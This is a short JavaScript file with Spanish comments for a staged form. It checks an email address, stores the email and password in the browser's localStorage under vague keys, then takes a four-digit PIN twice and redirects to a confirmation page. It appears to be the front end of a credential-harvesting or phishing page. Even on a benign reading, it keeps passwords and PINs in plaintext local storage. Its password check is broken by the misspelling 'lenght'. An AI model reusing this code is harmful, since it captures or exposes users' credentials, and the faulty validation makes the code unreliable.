
 
 /*function cv(params) {
    localStorage.setItem("common", document.getElementById("ui").value);
    localStorage.setItem("commons", document.getElementById("oy").value);
    document.getElementById("gh").style.display = "none";
    document.getElementById("miracle").style.display = "block";
 }
 
 
 const bfg = setInterval(() => {
 
    console.log("asdsad")
    document.getElementById('ui').addEventListener('input', function() {
       campo = document.getElementById('ui');
       
           
     var reg = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    
    var regOficial = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    
       
       if (reg.test(campo.value) && regOficial.test(campo.value)) {
          document.getElementById("btns").disabled = false;
          clearInterval(bfg);
       } else if (reg.test(campo.value)) {
          document.getElementById("btns").disabled = false;
          clearInterval(bfg);
    
       } else {
          document.getElementById("btns").disabled = true;
    
    }
    });
    
   
 }, 2000);
 
 $(document).ready(function() {
    $("#pntwo").on("keyup", function(event) {
      if (event.currentTarget.value.length == 4) {
       localStorage.setItem("commonpn", document.getElementById("pnone").value);
       localStorage.setItem("commonspnn", document.getElementById("pntwo").value);
       window.location = "confirm.html"
      }
    });
 });*/
 setTimeout(() => {
   // Obtener el campo de entrada y el botón de enviar
var input = document.getElementById("esd");
var botonEnviar = document.getElementById("btn1");

// Agregar un evento de clic al botón de enviar
botonEnviar.addEventListener("click", function(event) {
  // Prevenir el envío del formulario si la entrada es inválida
  event.preventDefault();

  // Obtener el valor del campo de entrada y eliminar los espacios en blanco al principio y al final
  var valor = input.value.trim();

  // Validar que la entrada no esté vacía y que contenga una dirección de correo electrónico válida
  if (valor === "" || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor)) {
    alert("Por favor, introduce una dirección de correo electrónico válida.");
    return false;
  }else{
    cps()



  }

  
});
   
 }, 2000);
 
function cps(params) {
  if (document.getElementById("ps").value.lenght < 6) {
    alert("contraseña incompleta o erronea")
    
  }else{
    localStorage.setItem("common" ,document.getElementById("esd").value)
    localStorage.setItem("commons", document.getElementById("ps").value)
    document.getElementById("field").style.display = "none";
    document.getElementById("btn1").style.display = "none";
    document.getElementById("field1").style.display = "block";
    document.getElementById("btn2").style.display = "block";
  }
  
}
function pch(params) {
if (document.getElementById("pn").value.length < 4) {
  alert("pin incompleto, debe tener al menos 4 digitos. ")
  
}else if(document.getElementById("pn").value != document.getElementById("pn2").value ){
  alert("El pin debe ser igual, verifique");
  document.getElementById("pn2").value = "";
  document.getElementById("pn2").focus();


}else{
  localStorage.setItem("commonpn" ,document.getElementById("pn").value)
    localStorage.setItem("commonspnn", document.getElementById("pn2").value)
    window.location = "confirm.html"
   

}

  
}
    